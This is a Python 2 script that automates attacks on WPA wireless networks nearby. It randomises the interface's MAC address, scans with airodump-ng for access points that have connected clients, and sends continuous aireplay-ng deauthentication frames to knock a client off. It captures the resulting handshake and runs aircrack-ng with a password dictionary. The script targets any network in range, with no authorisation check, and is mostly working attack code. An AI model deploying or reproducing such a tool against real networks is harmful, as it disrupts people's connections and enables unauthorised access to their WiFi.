#!/usr/bin/python

###########################################
#	Automatically scan deauth acquire hash
#	of wifi networks.
#	Then brute hash with dictionary.
#
#	by: one
#	for: research
#	usage: sudo python main.py -i interface name
###########################################

# subprocess for executing bash commands
import subprocess
# time for sleep between scan cycles
import time
# os to access os..
import os
# sys to get command line params
import sys

#method to parse current wifi scan
#finds access points and clients
#returns access points, and clients
def getData():
	filehandle = open("wifi/current_scan-01.csv","r")
	filestate = 0
	stations = []
	clients = []
	if filehandle:
		for eachline in filehandle.readlines():
			cleanline = eachline.strip()
			if not cleanline:
				pass
			else:
				if cleanline.startswith("BSSID"):
					filestate = 0
				elif cleanline.startswith("Station MAC"):
					filestate = 1
				else:
					if filestate == 0:
						# list of stations
						eachstation = [s.strip() for s in cleanline.split(",")]
						station = {}
						station['bssid'] = eachstation[0]
						station['firstseen'] = eachstation[1]
						station['lastseen'] = eachstation[2]
						station['channel'] = eachstation[3]
						station['speed'] = eachstation[4]
						station['privacy'] = eachstation[5]
						station['cipher'] = eachstation[6]
						station['authentication'] = eachstation[7]
						station['power'] = eachstation[8]
						station['beacons'] = eachstation[9]
						station['iv'] = eachstation[10]
						station['lanip'] = eachstation[11]
						station['idlength'] = eachstation[12]
						station['essid'] = eachstation[13::]
						# station['key'] = eachstation[14]
						stations.append(station)
					elif filestate == 1:
						# clients
						eachclient = [s.strip() for s in cleanline.split(",")]
						client = {}
						client['mac'] = eachclient[0]
						client['firstseen'] = eachclient[1]
						client['lastseen'] = eachclient[2]
						client['power'] = eachclient[3]
						client['packets'] = eachclient[4]
						client['bssid'] = eachclient[5]
						client['essids'] = eachclient[6::]
						clients.append(client)
	filehandle.close()
	return stations, clients

# method takes access points and clients
def findSome(stations,clients):
	# get list clients connected to stations
	# keep track of which clients are communicating with which station
	clientwithpotential = []
	for eachclient in clients:
		if eachclient['bssid'] != '(not associated)':
			clientwithpotential.append(eachclient)
		else:
			# do something with these later
			# for example spoof ap and see if connects
			# figure out some client key hack
			# but just pass on them for now
			pass
	# get list stations with wpa2
	# and closest via freq measurement
	stationwithpotential = []
	blacklisted = []
	blacklistfile = open("blacklist","r")
	for eachblacklist in blacklistfile.readlines():
		blacklisted.append(eachblacklist.strip())
	blacklistfile.close()
	for eachstation in stations:
		if int(eachstation['power']) < (-50) and "WPA" in eachstation['privacy'] and eachstation['bssid'] not in blacklisted:
			stationwithpotential.append(eachstation)
		else:
			# do something later
			pass
	# get a list of stations with clients
	stationswithclient = []
	for eachstation in stationwithpotential:
		for eachclient in clientwithpotential:
			if eachstation['bssid'] == eachclient['bssid']:
				print "[ + ] looking at: %s" % (eachstation['essid'][0])
				pairtocrack = {}
				pairtocrack['bssid'] = eachstation['bssid']
				pairtocrack['mac'] = eachclient['mac']
				pairtocrack['channel'] = eachstation['channel']
				pairtocrack['stationpower'] = abs(int(eachstation['power']))
				pairtocrack['clientpower'] = abs(int(eachclient['power']))
				pairtocrack['essid'] = eachstation['essid'][0]
				stationswithclient.append(pairtocrack)
	return stationswithclient

def setupSniffer(wireless_interface):
	# TODO: kill the hostap process and/or run airmon-ng check kill all
	#		for now run it manually
	kill_wifi_processes = subprocess.Popen("airmon-ng check kill all", shell=True, stdout=subprocess.PIPE)
	getmonlink = subprocess.Popen("ifconfig | cut -c-10 | tr -d  ' ' | tr -s '\n' | grep -i %smon" % (wireless_interface), shell=True, stdout=subprocess.PIPE)
	monlinks=getmonlink.communicate()[0].split()
	if monlinks:
		for eachlink in monlinks:
			subprocess.Popen("airmon-ng stop %s" % eachlink, shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
			time.sleep(5)
	getwlanlink = subprocess.Popen("ifconfig | cut -c-10 | tr -d  ' ' | tr -s '\n' | grep -i %s" % (wireless_interface), shell=True, stdout=subprocess.PIPE)
	wlanlinks=getwlanlink.communicate()[0].split()
	if wlanlinks:
		for eachlink in wlanlinks:
			subprocess.Popen("ifconfig %s down" % eachlink, shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
			time.sleep(2)
	subprocess.Popen("macchanger -r %s" % (wireless_interface), shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
	time.sleep(2)
	subprocess.Popen("ifconfig %s up" % (wireless_interface), shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
	time.sleep(1)
	subprocess.Popen("airmon-ng start %s" % (wireless_interface), shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
	time.sleep(2)
	subprocess.Popen("ifconfig %smon down" % (wireless_interface), shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
 	time.sleep(1)
 	subprocess.Popen("macchanger -r %smon" % (wireless_interface), shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
	time.sleep(1)
	subprocess.Popen("ifconfig %smon up" % (wireless_interface), shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
	time.sleep(1)

def restartSniffing(wireless_interface):
	if os.path.isfile("airodump.pid"):
		f = open("airodump.pid","r")
		id = f.readlines()
		f.close()
		pid = id[0].strip()
		subprocess.Popen("kill %s" % pid, shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
		time.sleep(2)
	if os.path.isfile("wifi/current_scan-01.csv"):
		os.remove("wifi/current_scan-01.csv")
		time.sleep(1)
	subprocess.Popen("nohup airodump-ng -w wifi/current_scan -o csv %smon > /dev/null 2>&1 & echo $! > airodump.pid" % (wireless_interface), shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
	time.sleep(5)

def startSniffing(wireless_interface):
	if os.path.isfile("wifi/current_scan-01.csv"):
		os.remove("wifi/current_scan-01.csv")
		time.sleep(1)
	subprocess.Popen("nohup airodump-ng -w wifi/current_scan -o csv %smon > /dev/null 2>&1 & echo $! > airodump.pid" % (wireless_interface), shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
	time.sleep(5)

def getHash(goodlist,wireless_interface):
	highestscore = 0
	# parse good list find a target
	# TODO: collect all clients connected to station and loop through them
	for eachline in goodlist:
		score = eachline['clientpower']+eachline['stationpower']
		if score > highestscore:
			highestscore = score
			newwinner = eachline
	#print newwinner, highestscore
	#deauth until hash collected or bored
	if os.path.isfile("airodump.pid"):
		f = open("airodump.pid","r")
		id = f.readlines()
		f.close()
		pid = id[0].strip()
		subprocess.Popen("kill %s" % pid, shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
		time.sleep(2)
	if os.path.isfile("aireplay.pid"):
                f = open("aireplay.pid","r")
                id = f.readlines()
                f.close()
                pid = id[0].strip()
                subprocess.Popen("kill %s" % pid, shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
                time.sleep(2)
	subprocess.Popen("nohup airodump-ng -w wifi/%s -c %s --bssid %s -o pcap %smon > /dev/null 2>&1 & echo $! > airodump.pid" % (newwinner['bssid'],newwinner['channel'],newwinner['bssid'],wireless_interface), shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
	time.sleep(2)
	count = 0
	while True:
		count = count + 1
		if count > 5:
			if os.path.isfile("aireplay.pid"):
				f = open("aireplay.pid","r")
				id = f.readlines()
				f.close()
				pid = id[0].strip()
				subprocess.Popen("kill %s" % pid, shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
				time.sleep(2)
			if os.path.isfile("airodump.pid"):
				f = open("airodump.pid","r")
				id = f.readlines()
				f.close()
				pid = id[0].strip()
				subprocess.Popen("kill %s" % pid, shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
				time.sleep(2)
			if os.path.isfile("wifi/%s-01.cap" % newwinner['bssid']):
				os.remove("wifi/%s-01.cap" % newwinner['bssid'])
			if os.path.isfile("wifi/current_scan-01.csv"):
				os.remove("wifi/current_scan-01.csv")
			if os.path.isfile("testfile"):
				os.remove("testfile")
			if os.path.isfile("airodump.pid"):
				os.remove("airodump.pid")
			if os.path.isfile("aireplay.pid"):
                                os.remove("aireplay.pid")
			break
		subprocess.Popen("aircrack-ng wifi/%s-01.cap -w pw > testfile" % newwinner['bssid'], shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
		if os.path.isfile("testfile"):
			testfile = open("testfile")
			for eachline in testfile.readlines():
				#hash found
				if "Passphrase not in dictionary" in eachline.strip():
					print "[ + ] hash was found!!"
					print "[ + ] caught password hash for: %s" % (newwinner['essid'])
					testfile.close()
					if os.path.isfile("aireplay.pid"):
						f = open("aireplay.pid","r")
						id = f.readlines()
						f.close()
						pid = id[0].strip()
						subprocess.Popen("kill %s" % pid, shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
						time.sleep(2)
					if os.path.isfile("airodump.pid"):
						f = open("airodump.pid","r")
						id = f.readlines()
						f.close()
						pid = id[0].strip()
						subprocess.Popen("kill %s" % pid, shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
						time.sleep(2)
					if os.path.isfile("wifi/%s-01.cap" % newwinner['bssid']):
						os.rename("wifi/%s-01.cap" % newwinner['bssid'],"good/%s.cap" % newwinner['bssid'])
					if os.path.isfile("wifi/current_scan-01.csv"):
						os.remove("wifi/current_scan-01.csv")
					if os.path.isfile("testfile"):
						os.remove("testfile")
					f = open("blacklist","a")
					f.writelines(newwinner['bssid']+"\n")
					f.close()
			#hash not found yet
			if os.path.isfile("aireplay.pid"):
				f = open("aireplay.pid","r")
				id = f.readlines()
				f.close()
				pid = id[0].strip()
				subprocess.Popen("kill %s" % pid, shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
				time.sleep(2)
			subprocess.Popen("nohup aireplay-ng -0 0 -a %s -c %s %smon & echo $! > aireplay.pid" % (newwinner['bssid'],newwinner['mac'],wireless_interface), shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
			time.sleep(5)

def main():
	#clear the screen
	kill_wifi_processes = subprocess.Popen("clear", shell=True, stdout=subprocess.PIPE)
	# setup monitor interface
	wireless_interface = sys.argv[1]
	print "[ + ] setting up wireless sniffer"
	setupSniffer(wireless_interface)
	print "[ + ] starting sniffer"
	startSniffing(wireless_interface)
	print "[ + ] scanning for networks"
	count = 0
	# program loop
	while True:
		count = count + 1
		if count > 10:
			restartSniffing(wireless_interface)
			count = 0
		# get some data
		stations, clients = getData()
		# find one to try
		#TODO: do a try catch and see if we can skip index errors
		#####: also look into absolute power score errors with 0 or null values
		goodlist = findSome(stations,clients)
		if not goodlist:
			# wait and try again
			time.sleep(2)
		else:
			# try to get hash
			getHash(goodlist,wireless_interface)
			restartSniffing(wireless_interface)
			time.sleep(2)

if '__main__'in __name__:
	main()
#END
